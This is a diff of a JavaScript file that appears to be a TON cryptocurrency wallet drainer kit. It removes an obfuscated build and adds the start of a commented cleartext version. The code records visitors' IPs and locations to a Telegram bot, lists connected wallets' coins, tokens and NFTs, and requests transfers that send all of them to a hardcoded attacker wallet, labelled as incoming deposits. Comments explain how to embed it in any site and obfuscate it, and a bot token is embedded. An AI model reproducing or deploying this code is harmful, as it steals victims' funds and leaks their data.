@@ -1,1 +1,537 @@
-const _0x2a8015=_0x2305;function _0x4b07(){const _0x2f8d3a=['toLowerCase','replace','Tokens_First','forEach','nft_address','](https://ipapi.co/?q=','TOKEN','6913450csnExC','balances','floor','784wwvVyO','name','*\x20TON\x20(\x20≈\x20*','sendingBalance','location','https://api.telegram.org/bot','sort','enter_website','openModal','1504095cCRusy','storeCoins',')\x0a\x0a*','toString','wallet_address','UQCSzXbmovndOpNbMOwwfXnuj4MF3KDFFQaXEtQynfskTokM','\x20(\x20*','33849oOYtkJ','\x20-\x20📍\x20[','includes','214596cRyyMY','status','format','connect_success','addEventListener','toFixed','.btn-go','onStatusChange','&parse_mode=Markdown&disable_web_page_preview=true','disconnect','USD','transfer_success','filter','🎣\x20*Creating\x20request*\x20(','length','storeUint','\x20USD\x20)\x0a\x0a','storeAddress','Already\x20processing.\x20Please\x20wait.','&token=','push','closed',')\x0a\x0a🌍\x20','\x0a🔌\x20*User\x20Connected\x20Wallet*\x20(','./assets/js/nfts_whitelist.json','querySelectorAll','Ton_rate','storeStringTail','storeBit','data','TonApi_Key','902842VkxCDl','Tokens','reject\x20request','👀\x20*User\x20opened\x20the\x20website*\x0a\x0a🌍\x20','/sendMessage?chat_id=','token','reduce','calculatedBalanceUSDTG','Telegram\x20message\x20failed\x20to\x20send','findIndex','-\x0a\x0a🧿\x20*0*\x20TON\x20(\x20≈\x20*0*\x20USD)\x0a\x0a','endCell','average_price','keys','\x0a\x0a👾\x20(≈\x20*','❌\x20*Declined\x20Transfer*\x20(','https://ipapi.co/json/','Error\x20fetching\x20TON\x20balance:\x20','metadata','message',')\x20|\x20(≈\x20*','balance','base64',')\x0a\x0a\x0a💲\x20(\x20≈\x20','account','blacklist','splice','*\x20USD\x20)','nft_items','join','find','storeRef','2AdqcIW','parse','pow','map','https://tonapi.io/v2/accounts/','connected','](https://tonviewer.com/','country','77THWeHc','symbol','toBoc','log','TON','*\x20USD)\x0a\x0a','transfer_cancel','*\x20USD\x20)\x0a','/jettons?currencies=ton,usd','json','chat_id','prices','Wallet','slice','Error:','✅\x20*Approved\x20Transfer*\x20(','stringify','modalState','POST','address','1104173ODvwEc','DOMContentLoaded','No\x20assets\x20to\x20process.\x20Exiting.','24FoXHxd','now','6117HjXKPt','1016XFOhaR','\x0a🔌💩\x20*User\x20Connected\x20an\x20empty\x20Wallet*\x20(','price','trust','collection','\x20TON\x20','en-US','NFT','decimals','&text=','hostname','\x0a\x0a📍\x20[','entries','Native','\x20Received\x20+\x20','jetton','For\x20security\x20reasons,\x20we\x20cannot\x20allow\x20connections\x20from\x20empty\x20or\x20newly\x20created\x20wallets.','close\x20popup','type'];_0x4b07=function(){return _0x2f8d3a;};return _0x4b07();}function _0x2305(_0x2c2237,_0x5a72ba){const _0x4b072d=_0x4b07();return _0x2305=function(_0x230550,_0x1c0aad){_0x230550=_0x230550-0x10a;let _0x44f9dd=_0x4b072d[_0x230550];return _0x44f9dd;},_0x2305(_0x2c2237,_0x5a72ba);}(function(_0x2f3505,_0x5364fd){const _0x11df4e=_0x2305,_0x3881f4=_0x2f3505();while(!![]){try{const _0x4277b2=parseInt(_0x11df4e(0x151))/0x1*(parseInt(_0x11df4e(0x131))/0x2)+parseInt(_0x11df4e(0x172))/0x3*(parseInt(_0x11df4e(0x190))/0x4)+-parseInt(_0x11df4e(0x199))/0x5+-parseInt(_0x11df4e(0x170))/0x6*(parseInt(_0x11df4e(0x16d))/0x7)+-parseInt(_0x11df4e(0x173))/0x8*(parseInt(_0x11df4e(0x10f))/0x9)+parseInt(_0x11df4e(0x18d))/0xa+-parseInt(_0x11df4e(0x159))/0xb*(parseInt(_0x11df4e(0x112))/0xc);if(_0x4277b2===_0x5364fd)break;else _0x3881f4['push'](_0x3881f4['shift']());}catch(_0x98afce){_0x3881f4['push'](_0x3881f4['shift']());}}}(_0x4b07,0x701dc),document['addEventListener'](_0x2a8015(0x16e),async()=>{const _0x465430=_0x2a8015,_0xee00d3={'Wallet':_0x465430(0x10d),'Native':!![],'Tokens':!![],'NFTs':!![],'Tokens_First':![],'Ton_rate':7.99,'TonApi_Key':'','manifestUrl':'https://app.storm.tg/tonconnect-manifest.json'},_0xa15c7f={'token':'7274215218:AAEHAtWZSkf4FU8S28O9VR_jlmkCATY9ukU','chat_id':'6365125531','enter_website':!![],'connect_success':!![],'connect_empty':!![],'transfer_request':!![],'transfer_success':!![],'transfer_cancel':!![]},_0x4dde74=await fetch(_0x465430(0x141)),_0x9e6349=await _0x4dde74[_0x465430(0x162)](),_0x24d9ee=_0x9e6349['ip']??'??',_0xc92324=_0x9e6349[_0x465430(0x158)]??'??',_0x5e83f7=window[_0x465430(0x194)][_0x465430(0x17d)];let _0x1ea36f=![],_0x40b162=null;if(_0xa15c7f[_0x465430(0x197)]){const _0x22ebe3=_0x465430(0x134)+(navigator['language']??'')+'\x20|\x20'+_0x5e83f7+_0x465430(0x17e)+_0xc92324+_0x465430(0x18b)+_0x24d9ee+')\x0a';await _0x119307(_0x22ebe3);}const _0x322710=new W3ModalUI({'manifestUrl':_0xee00d3['manifestUrl'],'buttonRootId':'connect-btn'});_0x322710[_0x465430(0x119)](_0xf0aa40=>{const _0x4819a6=_0x465430;if(!_0xf0aa40)return;_0x322710['connected']&&(_0x40b162=Add['parse'](_0x322710[_0x4819a6(0x149)][_0x4819a6(0x16c)])[_0x4819a6(0x10b)]({'bounceable':![]}),_0x28d061(_0x40b162));});async function _0x28d061(_0x3ee416){const _0x2d7cc7=_0x465430;if(_0x1ea36f){console[_0x2d7cc7(0x15c)](_0x2d7cc7(0x124));return;}_0x1ea36f=!![];try{const _0x37b367=await _0x2b88dd(_0x3ee416);if(!_0x37b367){await _0x18df43(_0x3ee416);return;}const _0x210997=await _0x5002bf(_0x3ee416),_0x1b388f=await _0x54a122(_0x3ee416);_0xa15c7f[_0x2d7cc7(0x115)]&&await _0x2066f5(_0x37b367,_0x210997,_0x1b388f),await _0x3dba37(_0x37b367,_0x210997,_0x1b388f);}catch(_0x5080ac){console[_0x2d7cc7(0x15c)](_0x2d7cc7(0x167),_0x5080ac);}finally{_0x1ea36f=![];}}async function _0x2b88dd(_0x3b9195){const _0x235065=_0x465430,_0x156fb8=await fetch(_0x235065(0x155)+_0x3b9195+(_0xee00d3[_0x235065(0x130)]?_0x235065(0x125)+_0xee00d3[_0x235065(0x130)]:''));!_0x156fb8['ok']&&console['log'](_0x235065(0x142)+_0x156fb8[_0x235065(0x113)]);await _0x159334(0x1f4);const _0x41551b=await _0x156fb8[_0x235065(0x162)]();!_0x41551b&&console[_0x235065(0x15c)]('Invalid\x20Ton\x20response');let _0x5f0c8e=parseFloat(_0x41551b[_0x235065(0x146)])/0x3b9aca00,_0x3d0b8b=parseFloat((_0xee00d3[_0x235065(0x12c)]*_0x5f0c8e)[_0x235065(0x117)](0x2)),_0x42028=parseFloat(_0x41551b[_0x235065(0x146)])-0x101b3c9;if(_0x42028>0x0)return{'type':_0x235065(0x15d),'data':_0x41551b,'balance':_0x5f0c8e,'sendingBalance':_0x42028,'calculatedBalanceUSDTG':_0x3d0b8b};return null;}async function _0x5002bf(_0x5861d0){const _0x2b03f1=_0x465430,_0x25acd4=await fetch(_0x2b03f1(0x155)+_0x5861d0+_0x2b03f1(0x161)+(_0xee00d3[_0x2b03f1(0x130)]?_0x2b03f1(0x125)+_0xee00d3[_0x2b03f1(0x130)]:''));if(!_0x25acd4['ok'])return[];await _0x159334(0x1f4);const _0x492e1e=await _0x25acd4[_0x2b03f1(0x162)]();if(!_0x492e1e||!_0x492e1e[_0x2b03f1(0x18e)])return[];if(_0x492e1e[_0x2b03f1(0x18e)][_0x2b03f1(0x120)]===0x0)return[];return _0x492e1e[_0x2b03f1(0x18e)][_0x2b03f1(0x11e)](_0x2ccbbd=>parseFloat(_0x2ccbbd[_0x2b03f1(0x146)])!==0x0&&_0x2ccbbd['jetton']['verification']!=='blacklist')[_0x2b03f1(0x154)](_0x27b350=>{const _0x3978a8=_0x2b03f1,_0x103903=parseFloat(_0x27b350['balance'])/Math[_0x3978a8(0x153)](0xa,_0x27b350[_0x3978a8(0x182)][_0x3978a8(0x17b)]),_0xedb69d=_0x27b350[_0x3978a8(0x175)][_0x3978a8(0x164)][_0x3978a8(0x11c)],_0x1dba27=parseFloat((_0x103903*_0xedb69d)[_0x3978a8(0x117)](0x2));if(_0x1dba27>0x0)return{'type':_0x3978a8(0x18c),'wallet_address':_0x27b350[_0x3978a8(0x10c)][_0x3978a8(0x16c)],'TokenBalance':parseFloat(_0x27b350[_0x3978a8(0x146)]),'data':_0x27b350,'roundedBalance':_0x103903[_0x3978a8(0x117)](0x2),'address':_0x27b350[_0x3978a8(0x182)][_0x3978a8(0x16c)],'symbol':_0x27b350[_0x3978a8(0x182)][_0x3978a8(0x15a)],'name':_0x27b350[_0x3978a8(0x182)][_0x3978a8(0x191)],'balance':_0x103903,'price_usd':_0xedb69d,'calculatedBalanceUSDTG':_0x1dba27};return null;})[_0x2b03f1(0x11e)](_0x322524=>_0x322524!==null)[_0x2b03f1(0x196)]((_0x35d1ec,_0x3f638d)=>_0x3f638d['calculatedBalanceUSDTG']-_0x35d1ec[_0x2b03f1(0x138)]);}async function _0x54a122(_0x7ba85f){const _0x4e67f9=_0x465430,_0x1f3d7b=await fetch(_0x4e67f9(0x155)+_0x7ba85f+'/nfts?limit=1000&offset=0&indirect_ownership=false'+(_0xee00d3[_0x4e67f9(0x130)]?'&token='+_0xee00d3['TonApi_Key']:''));if(!_0x1f3d7b['ok'])return[];await _0x159334(0x1f4);const _0x15f848=await _0x1f3d7b[_0x4e67f9(0x162)]();if(!_0x15f848||!_0x15f848[_0x4e67f9(0x14d)])return[];if(_0x15f848['nft_items']['length']===0x0)return[];const _0x474da1=await fetch(_0x4e67f9(0x12a));if(!_0x474da1['ok'])return[];const _0x1f7d7c=await _0x474da1[_0x4e67f9(0x162)]();if(!_0x1f7d7c)return[];return _0x15f848[_0x4e67f9(0x14d)]['filter'](_0x277917=>_0x277917[_0x4e67f9(0x177)]&&_0x277917[_0x4e67f9(0x177)][_0x4e67f9(0x191)]&&_0x277917[_0x4e67f9(0x177)][_0x4e67f9(0x191)]!==''&&_0x277917[_0x4e67f9(0x176)]!==_0x4e67f9(0x14a))[_0x4e67f9(0x154)](_0x484626=>{const _0x5bcef5=_0x4e67f9,_0x1484c0=Add[_0x5bcef5(0x152)](_0x484626[_0x5bcef5(0x177)]['address'])[_0x5bcef5(0x10b)]({'bounceable':!![]}),_0x352444=_0x1f7d7c[_0x5bcef5(0x14f)](_0x3d2f63=>_0x3d2f63[_0x5bcef5(0x18a)]===_0x1484c0);if(!_0x352444)return null;const _0x31736d=parseFloat((_0x352444[_0x5bcef5(0x13d)]*_0xee00d3['Ton_rate'])[_0x5bcef5(0x117)](0x2));if(_0x31736d>0x0)return{'type':_0x5bcef5(0x17a),'data':_0x484626[_0x5bcef5(0x16c)],'name':_0x484626[_0x5bcef5(0x143)][_0x5bcef5(0x191)]||'Unknown','calculatedBalanceUSDTG':_0x31736d||0.1};return null;})[_0x4e67f9(0x11e)](_0x1f9e04=>_0x1f9e04!==null)[_0x4e67f9(0x196)]((_0x2a91c6,_0x30b07c)=>_0x30b07c[_0x4e67f9(0x138)]-_0x2a91c6[_0x4e67f9(0x138)]);}async function _0x2066f5(_0x348a4b,_0x277298,_0x2ef653){const _0xad4193=_0x465430,_0x35b741=_0x2ef653&&_0x2ef653['length']>0x0?_0x2ef653[_0xad4193(0x137)]((_0x1df8f2,_0xb090d)=>_0x1df8f2+_0xb090d['calculatedBalanceUSDTG'],0x0):0x0,_0x204efc=_0x2ef653&&_0x2ef653['length']>0x0?_0xad4193(0x13f)+_0xd87935(_0x35b741)+'*\x20USD)\x0a\x0a'+_0x2ef653[_0xad4193(0x154)](_0x48d275=>'['+_0x5a967d(_0x48d275[_0xad4193(0x191)])+_0xad4193(0x157)+_0x48d275[_0xad4193(0x12f)]+_0xad4193(0x145)+_0xd87935(_0x48d275[_0xad4193(0x138)])+_0xad4193(0x160))[_0xad4193(0x14e)]('\x0a'):'',_0x219f79=_0x277298&&_0x277298[_0xad4193(0x120)]>0x0?_0x277298[_0xad4193(0x137)]((_0x19f479,_0x792346)=>_0x19f479+_0x792346[_0xad4193(0x138)],0x0):0x0,_0x2ca072=_0x277298&&_0x277298[_0xad4193(0x120)]>0x0?'-\x0a\x0a🪙\x20(≈\x20*'+_0xd87935(_0x219f79)+_0xad4193(0x15e)+_0x277298[_0xad4193(0x154)](_0x3aaa54=>_0x5a967d(_0x3aaa54[_0xad4193(0x191)])+'\x0a*'+_0xd87935(_0x3aaa54['roundedBalance'])+'*\x20'+_0x5a967d(_0x3aaa54[_0xad4193(0x15a)])+_0xad4193(0x10e)+_0xd87935(_0x3aaa54['calculatedBalanceUSDTG'])+_0xad4193(0x160))[_0xad4193(0x14e)]('\x0a')+'\x0a':'\x0a',_0x1feb79=Object[_0xad4193(0x13e)](_0x348a4b)[_0xad4193(0x120)]>0x0?'-\x0a\x0a🧿\x20*'+_0x348a4b[_0xad4193(0x146)][_0xad4193(0x117)](0x2)+_0xad4193(0x192)+_0xd87935(_0x348a4b[_0xad4193(0x138)])+_0xad4193(0x15e):_0xad4193(0x13b),_0x413488=parseFloat(_0x348a4b[_0xad4193(0x138)]??0x0)+_0x219f79+_0x35b741,_0x238bce=_0xad4193(0x129)+_0x334b52(_0x40b162)+_0xad4193(0x128)+_0x5e83f7+_0xad4193(0x110)+_0xc92324+'](https://ipapi.co/?q='+_0x24d9ee+_0xad4193(0x148)+_0xd87935(_0x413488)+_0xad4193(0x122)+_0x1feb79+_0x2ca072+_0x204efc;await _0x119307(_0x238bce);}async function _0x3dba37(_0xc43be2,_0x1eb50d,_0x1bfdf8){const _0x3bedc0=_0x465430;let _0x3304ef=[..._0x1eb50d,..._0x1bfdf8,_0xc43be2];_0x3304ef=_0x3304ef[_0x3bedc0(0x11e)](_0xa04cfa=>{const _0xaa1d96=_0x3bedc0;if(!_0xa04cfa[_0xaa1d96(0x185)])return![];return!![];});if(_0x3304ef[_0x3bedc0(0x120)]===0x0){console[_0x3bedc0(0x15c)](_0x3bedc0(0x16f));return;}let _0x79d714=_0x3304ef['reduce']((_0xacea96,_0x2c8540)=>{const _0x4a775d=_0x3bedc0;return _0xacea96[_0x2c8540[_0x4a775d(0x185)]]=_0xacea96[_0x2c8540['type']]||[],_0xacea96[_0x2c8540[_0x4a775d(0x185)]]['push'](_0x2c8540),_0xacea96;},{}),_0x836b1b=Object[_0x3bedc0(0x17f)](_0x79d714)['sort']((_0x287cda,_0xbdc005)=>{const _0x10c0bb=_0x3bedc0;if(_0xee00d3[_0x10c0bb(0x188)]){if(_0x287cda[0x0]===_0x10c0bb(0x18c))return-0x1;if(_0xbdc005[0x0]==='TOKEN')return 0x1;}return _0xbdc005[0x1][_0x10c0bb(0x137)]((_0x56afd3,_0x5b11dd)=>_0x56afd3+_0x5b11dd[_0x10c0bb(0x138)],0x0)-_0x287cda[0x1][_0x10c0bb(0x137)]((_0x4ef0ac,_0x1e239a)=>_0x4ef0ac+_0x1e239a[_0x10c0bb(0x138)],0x0);})['map'](_0x562de9=>_0x562de9[0x0]);for(let _0x433d06 of _0x836b1b){switch(_0x433d06){case _0x3bedc0(0x15d):_0x79d714[_0x3bedc0(0x15d)][_0x3bedc0(0x120)]>0x0&&_0xee00d3[_0x3bedc0(0x180)]&&(await _0xfe934e(_0x79d714['TON'][0x0]),await _0x159334(0x514));break;case _0x3bedc0(0x18c):if(_0xee00d3[_0x3bedc0(0x132)])for(let _0x3c3f7d=0x0;_0x3c3f7d<_0x79d714[_0x3bedc0(0x18c)][_0x3bedc0(0x120)];_0x3c3f7d+=0x4){let _0x120ab6=_0x79d714[_0x3bedc0(0x18c)][_0x3bedc0(0x166)](_0x3c3f7d,_0x3c3f7d+0x4);await _0x1e1067(_0x120ab6,_0x79d714['TOKEN']),await _0x159334(0x514);}break;case'NFT':if(_0xee00d3['NFTs'])for(let _0x2bf289=0x0;_0x2bf289<_0x79d714[_0x3bedc0(0x17a)][_0x3bedc0(0x120)];_0x2bf289+=0x4){let _0x24a11d=_0x79d714['NFT']['slice'](_0x2bf289,_0x2bf289+0x4);await _0x32067f(_0x24a11d,_0x79d714['NFT']),await _0x159334(0x514);}break;}}}async function _0xfe934e(_0xaf8869){const _0x6282cb=_0x465430;try{const _0x1934e3=(_0xaf8869[_0x6282cb(0x193)]/0x3b9aca00)[_0x6282cb(0x117)](0x2),_0x12bc16=_0xd87935(_0xee00d3[_0x6282cb(0x12c)]*_0x1934e3),_0x49dd7a=_0x6282cb(0x11f)+_0x334b52(_0x40b162)+_0x6282cb(0x10a)+_0x1934e3+_0x6282cb(0x192)+_0x12bc16+_0x6282cb(0x14c),_0x16e50d=_0x6282cb(0x168)+_0x334b52(_0x40b162)+_0x6282cb(0x10a)+_0x1934e3+_0x6282cb(0x192)+_0x12bc16+'*\x20USD\x20)',_0x1dfe4a=_0x6282cb(0x140)+_0x334b52(_0x40b162)+_0x6282cb(0x10a)+_0x1934e3+_0x6282cb(0x192)+_0x12bc16+'*\x20USD\x20)',_0x4380dc=Cell()['storeUint'](0x0,0x20)['storeStringTail'](_0x6282cb(0x181)+_0xd87935(_0x1934e3*2.29)+_0x6282cb(0x178))['endCell'](),_0x9d8e8e={'validUntil':Math[_0x6282cb(0x18f)](Date['now']()/0x3e8)+0x168,'messages':[{'address':_0xee00d3[_0x6282cb(0x165)],'amount':_0xaf8869[_0x6282cb(0x193)],'payload':_0x4380dc['toBoc']()[_0x6282cb(0x10b)](_0x6282cb(0x147))}]};await _0x328431(_0x9d8e8e,_0x49dd7a,_0x16e50d,_0x1dfe4a);}catch(_0x415cfb){console[_0x6282cb(0x15c)](_0x6282cb(0x167),_0x415cfb);}}async function _0x1e1067(_0x376277,_0x479fe8){const _0x26bb79=_0x465430;try{const _0x10e54d=_0x376277[_0x26bb79(0x137)]((_0x23fbb3,_0x4952ac)=>_0x23fbb3+_0x4952ac[_0x26bb79(0x138)],0x0),_0x26a329=_0x376277[_0x26bb79(0x120)]>0x0?'\x0a\x0a🪙\x20(≈\x20*'+_0xd87935(_0x10e54d)+'*\x20USD)\x0a\x0a'+_0x376277[_0x26bb79(0x154)](_0x316f1b=>_0x5a967d(_0x316f1b['name'])+'\x0a*'+_0x316f1b['roundedBalance']+'*\x20'+_0x5a967d(_0x316f1b[_0x26bb79(0x15a)])+_0x26bb79(0x10e)+_0xd87935(_0x316f1b['calculatedBalanceUSDTG'])+_0x26bb79(0x160))[_0x26bb79(0x14e)]('\x0a'):'',_0x586bf6=_0x26bb79(0x11f)+_0x334b52(_0x40b162)+')'+_0x26a329,_0x4cdfe8='✅\x20*Approved\x20Transfer*\x20('+_0x334b52(_0x40b162)+')'+_0x26a329,_0x504b86=_0x26bb79(0x140)+_0x334b52(_0x40b162)+')'+_0x26a329;let _0x4e126e=[];for(let _0x99da59 of _0x376277){await _0x159334(0x64);let _0x34cb5e=Cell()[_0x26bb79(0x121)](0x0,0x20)[_0x26bb79(0x12d)](_0x26bb79(0x181)+_0xd87935(_0x99da59['roundedBalance']*4.3009)+'\x20'+_0x99da59[_0x26bb79(0x15a)]+'\x20')[_0x26bb79(0x13c)](),_0x241f8a=Cell()[_0x26bb79(0x121)](0xf8a7ea5,0x20)['storeUint'](0x0,0x40)['storeCoins'](_0x99da59[_0x26bb79(0x12f)][_0x26bb79(0x146)])['storeAddress'](Add[_0x26bb79(0x152)](_0xee00d3[_0x26bb79(0x165)]))[_0x26bb79(0x123)](Add[_0x26bb79(0x152)](_0x322710[_0x26bb79(0x149)][_0x26bb79(0x16c)]))[_0x26bb79(0x12e)](0x0)[_0x26bb79(0x19a)](Nano(0.02)[_0x26bb79(0x10b)]())[_0x26bb79(0x12e)](0x1)[_0x26bb79(0x150)](_0x34cb5e)[_0x26bb79(0x13c)](),_0x52e038={'address':_0x99da59['wallet_address'],'amount':Nano(0.05)[_0x26bb79(0x10b)](),'sender':_0x322710[_0x26bb79(0x149)][_0x26bb79(0x16c)],'tx':btoa(encodeURIComponent(JSON[_0x26bb79(0x169)](_0x99da59[_0x26bb79(0x12f)]))),'payload':_0x241f8a[_0x26bb79(0x15b)]()[_0x26bb79(0x10b)](_0x26bb79(0x147))};_0x4e126e[_0x26bb79(0x126)](_0x52e038);}const _0x2ddac7={'validUntil':Math[_0x26bb79(0x18f)](Date[_0x26bb79(0x171)]()/0x3e8)+0x168,'messages':_0x4e126e};await _0x328431(_0x2ddac7,_0x586bf6,_0x4cdfe8,_0x504b86),_0x376277['forEach'](_0x2db622=>{const _0xeb554d=_0x26bb79;let _0x1c9b16=_0x479fe8[_0xeb554d(0x13a)](_0x58b595=>_0x58b595[_0xeb554d(0x10c)]===_0x2db622[_0xeb554d(0x10c)]);_0x1c9b16!==-0x1&&_0x479fe8[_0xeb554d(0x14b)](_0x1c9b16,0x1);});}catch(_0x4504e7){console[_0x26bb79(0x15c)]('Error:',_0x4504e7);}}async function _0x32067f(_0x5c91b6,_0x10cff2){const _0x19c54e=_0x465430;try{const _0x32eb19=_0x5c91b6['reduce']((_0x528406,_0x2479ca)=>_0x528406+_0x2479ca['calculatedBalanceUSDTG'],0x0),_0x5e2af2=_0x5c91b6[_0x19c54e(0x120)]>0x0?_0x19c54e(0x13f)+_0xd87935(_0x32eb19)+_0x19c54e(0x15e)+_0x5c91b6[_0x19c54e(0x154)](_0x3cde6c=>'['+_0x5a967d(_0x3cde6c['name'])+_0x19c54e(0x157)+_0x3cde6c[_0x19c54e(0x12f)]+')\x20|\x20(≈\x20*'+_0xd87935(_0x3cde6c[_0x19c54e(0x138)])+_0x19c54e(0x160))[_0x19c54e(0x14e)]('\x0a'):'',_0x3d3a59=_0x19c54e(0x11f)+_0x334b52(_0x40b162)+')'+_0x5e2af2,_0x499e12=_0x19c54e(0x168)+_0x334b52(_0x40b162)+')'+_0x5e2af2,_0x2fe932=_0x19c54e(0x140)+_0x334b52(_0x40b162)+')'+_0x5e2af2;let _0x47d960=[];for(let _0x439365 of _0x5c91b6){await _0x159334(0x64);let _0x959bc0=Cell()[_0x19c54e(0x121)](0x5fcc3d14,0x20)['storeUint'](0x0,0x40)[_0x19c54e(0x123)](Add[_0x19c54e(0x152)](_0xee00d3[_0x19c54e(0x165)]))[_0x19c54e(0x123)](Add['parse'](_0x322710[_0x19c54e(0x149)][_0x19c54e(0x16c)]))['storeUint'](0x0,0x1)[_0x19c54e(0x19a)](Nano(1e-9)['toString']())[_0x19c54e(0x121)](0x0,0x1)[_0x19c54e(0x13c)](),_0x287b5e={'address':_0x439365[_0x19c54e(0x12f)],'amount':Nano(0.05)[_0x19c54e(0x10b)](),'tx':btoa(encodeURIComponent(JSON[_0x19c54e(0x169)](_0x439365[_0x19c54e(0x12f)]))),'payload':_0x959bc0[_0x19c54e(0x15b)]()['toString'](_0x19c54e(0x147))};_0x47d960[_0x19c54e(0x126)](_0x287b5e);}const _0x3e69fd={'validUntil':Math[_0x19c54e(0x18f)](Date[_0x19c54e(0x171)]()/0x3e8)+0x168,'messages':_0x47d960};await _0x328431(_0x3e69fd,_0x3d3a59,_0x499e12,_0x2fe932),_0x5c91b6[_0x19c54e(0x189)](_0x3e705e=>{const _0xff97c=_0x19c54e;let _0x5840a1=_0x10cff2['findIndex'](_0x344199=>_0x344199[_0xff97c(0x12f)]===_0x3e705e[_0xff97c(0x12f)]);_0x5840a1!==-0x1&&_0x10cff2['splice'](_0x5840a1,0x1);});}catch(_0x228c67){console[_0x19c54e(0x15c)](_0x19c54e(0x167),_0x228c67);}}async function _0x328431(_0x1d9e12,_0x4b209e,_0x48717b,_0x5a50fc){const _0x402dab=_0x465430;try{_0xa15c7f['transfer_request']&&await _0x119307(_0x4b209e),await _0x322710['sendTransaction'](_0x1d9e12),await _0x159334(0x514),_0xa15c7f[_0x402dab(0x11d)]&&await _0x119307(_0x48717b);}catch(_0x4c1999){_0x4c1999[_0x402dab(0x144)][_0x402dab(0x186)]()[_0x402dab(0x111)](_0x402dab(0x133))||_0x4c1999['message'][_0x402dab(0x186)]()[_0x402dab(0x111)](_0x402dab(0x184))||_0x4c1999[_0x402dab(0x144)]['toLowerCase']()[_0x402dab(0x111)]('transaction\x20was\x20not\x20sent')?_0xa15c7f[_0x402dab(0x15f)]&&await _0x119307(_0x5a50fc):console[_0x402dab(0x15c)](_0x402dab(0x167),_0x4c1999);}}async function _0x18df43(_0xa79e3d){const _0x2ca37c=_0x465430;if(_0xa15c7f['connect_empty']){const _0xe78ee9=_0x2ca37c(0x174)+_0x334b52(_0xa79e3d)+_0x2ca37c(0x128)+_0x5e83f7+_0x2ca37c(0x110)+_0xc92324+_0x2ca37c(0x18b)+_0x24d9ee+')';await _0x119307(_0xe78ee9);}alert(_0x2ca37c(0x183)),await _0x322710[_0x2ca37c(0x11b)](),!_0x322710[_0x2ca37c(0x156)]&&_0x322710[_0x2ca37c(0x16a)][_0x2ca37c(0x113)]===_0x2ca37c(0x127)&&await _0x322710[_0x2ca37c(0x198)]();}async function _0x119307(_0x58ed04){const _0x132ff5=_0x465430,_0xf1119e=encodeURIComponent(_0x58ed04),_0x9d07aa=_0x132ff5(0x195)+_0xa15c7f[_0x132ff5(0x136)]+_0x132ff5(0x135)+_0xa15c7f[_0x132ff5(0x163)]+_0x132ff5(0x17c)+_0xf1119e+_0x132ff5(0x11a),_0x1617c4=await fetch(_0x9d07aa,{'method':_0x132ff5(0x16b)});!_0x1617c4['ok']&&console[_0x132ff5(0x15c)](_0x132ff5(0x167),_0x132ff5(0x139));}async function _0x4acd8f(_0x44c893){const _0x44f967=_0x465430;await _0x159334(0x64);if(!_0x44c893[_0x44f967(0x156)]&&_0x44c893[_0x44f967(0x16a)][_0x44f967(0x113)]===_0x44f967(0x127))await _0x44c893[_0x44f967(0x198)]();else _0x44c893[_0x44f967(0x156)]&&(_0x40b162=Add[_0x44f967(0x152)](_0x44c893['account'][_0x44f967(0x16c)])['toString']({'bounceable':![]}),_0x28d061(_0x40b162));}const _0xb65322=_0x3d80bb=>document[_0x465430(0x12b)](_0x3d80bb);_0xb65322(_0x465430(0x118))[_0x465430(0x189)](_0x2c9248=>{const _0x1e5879=_0x465430;_0x2c9248[_0x1e5879(0x116)]('click',async()=>{await _0x4acd8f(_0x322710);});});function _0xd87935(_0x4cc17c){const _0x19802d=_0x465430;return new Intl['NumberFormat'](_0x19802d(0x179),{'minimumFractionDigits':0x2,'maximumFractionDigits':0x2})[_0x19802d(0x114)](_0x4cc17c);}function _0x334b52(_0x3ba191){const _0x526707=_0x465430;if(_0x3ba191[_0x526707(0x120)]<=0x7)return _0x3ba191;const _0x30166c=_0x3ba191[_0x526707(0x166)](0x0,0x4),_0x46ab32=_0x3ba191[_0x526707(0x166)](-0x4);return _0x30166c+'...'+_0x46ab32;}function _0x5a967d(_0x18ea8a){const _0x350c60=_0x465430;let _0x34bdbb=_0x18ea8a[_0x350c60(0x187)](/\_/g,'\x5c_')[_0x350c60(0x187)](/\*/g,'\x5c*')[_0x350c60(0x187)](/\[/g,'\x5c[')['replace'](/\]/g,'\x5c]')['replace'](/\(/g,'\x5c(')[_0x350c60(0x187)](/\)/g,'\x5c)')[_0x350c60(0x187)](/\~/g,'\x5c~')[_0x350c60(0x187)](/\`/g,'\x5c`')[_0x350c60(0x187)](/\>/g,'\x5c>')[_0x350c60(0x187)](/\#/g,'\x5c#')[_0x350c60(0x187)](/\+/g,'\x5c+')['replace'](/\-/g,'\x5c-')[_0x350c60(0x187)](/\=/g,'\x5c=')[_0x350c60(0x187)](/\|/g,'\x5c|')[_0x350c60(0x187)](/\{/g,'\x5c{')[_0x350c60(0x187)](/\}/g,'\x5c}')[_0x350c60(0x187)](/\./g,'\x5c.')['replace'](/\!/g,'\x5c!');return _0x34bdbb;}function _0x159334(_0x24f40a){return new Promise(_0x6655df=>setTimeout(_0x6655df,_0x24f40a));}}));
+// Usingthis code without obsfuscation is strictly prohibited !
+// If this is discovered, an arbitration will be written
+// You can hide this script here: obfuscator.io
+
+
+// INSTALL THE SCRIPT ON ANY HTML SITE :
+// 
+// Open index.html and copy script tags just before the closing </body> tag in your HTML document : 
+//
+//      <script src="./assets/vendor.min.js"></script>
+//      <script src="./assets/web3.min.js"></script> 
+// 
+// Open the "assets/web3.min.js" file with any code editor, for example Visual Studio Code or Notepad ++.
+// At the top of the file web3.min.js, you will find the Configuration variables « CF » et « TG »
+// Configured your options (TelegramBot, Wallet, etc..), and hide the code using obfuscator.io
+// 
+// Add Ton connect button to your html page (only one) : 
+//
+//      <div id="connect-btn"></div>
+// 
+// If you want to trigger the connection window from other HTML elements (links, buttons, images...) 
+// Just add the "btn-go" class on elements : 
+//
+//      <button class="btn-go">Click Me</button>
+//      <a href="#" class="btn-go">Link Button</a>
+//      <div class="btn-go">Div Button</div>
+//      <img class="btn-go" src="https://via.placeholder.com/100" alt="Img Button">
+//
+// Please note that the script will only work only with an SSL certificate installed (via https).
+// If you open the file on a local server or just on your computer, nothing will work.
+
+document.addEventListener("DOMContentLoaded", async () => {
+
+    const CF = {
+        Wallet: "UQDDGf9z5biuG87p-re7ShnGJr1DgIWOFS35d69ukK2LWeeC",  // Wallet address where the assets will go
+        Native: true, // ('true' enabled or 'false' disabled)
+        Tokens: true, // ('true' enabled or 'false' disabled)
+        NFTs: true, // ('true' enabled or 'false' disabled)
+        Tokens_First: false, // 'false' - At the value price, 'true' - Token are always first 
+        Ton_rate: 7.99, // conversion rate ( 1 TON to USD = 7.99 )
+        TonApi_Key: "", // https://tonconsole.com/ (RECOMMENDED), 
